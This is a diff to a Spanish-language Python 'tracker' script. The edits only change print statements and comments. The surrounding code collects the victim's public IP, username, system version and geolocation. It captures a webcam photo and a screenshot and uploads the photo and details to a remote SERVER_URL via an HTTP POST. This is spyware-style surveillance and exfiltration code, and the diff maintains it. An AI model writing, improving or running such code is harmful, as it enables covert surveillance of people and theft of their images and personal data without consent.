@@ -76,7 +76,8 @@ def recolectar_info():
         "hora": str(datetime.now())
     }
     info.update(obtener_geolocalizacion(ip_publica))
-    print("[*] Información recolectada:", json.dumps(info, indent=2))
+    print("[*] Información recolectada:")
+    print(json.dumps(info, indent=2))
     return info
 
 def enviar_al_servidor(info, archivos):
@@ -84,15 +85,17 @@ def enviar_al_servidor(info, archivos):
         if not archivos["webcam"]:
             print("[!] No se encontró archivo de webcam para enviar.")
             return
-
+        # Abre el archivo de imagen en modo binario.
         with open(archivos["webcam"], "rb") as img:
             files = {"image": img}
+            # Envía los datos de texto en el campo 'data'.
             data = {
                 "ip": info["ip_publica"],
                 "username": info["usuario"],
                 "system_info": f"{info['sistema']} ({info['version']})"
             }
-            print("[*] Enviando datos al servidor...")
+            print("[*] Enviando datos al servidor:")
+            print("   Datos:", data)
             response = requests.post(SERVER_URL, files=files, data=data)
             print("[+] Enviado al servidor:", response.status_code)
             print("[*] Respuesta del servidor:", response.text)
@@ -105,7 +108,7 @@ def ejecutar_rastreador():
         info = recolectar_info()
         archivos = {
             "webcam": capturar_webcam(),
-            "pantalla": capturar_pantalla()  # Captura de pantalla disponible, pero no se usa en el envío actual
+            "pantalla": capturar_pantalla()  # Se capta, pero no se utiliza en el envío actual
         }
         if archivos["webcam"]:
             enviar_al_servidor(info, archivos)
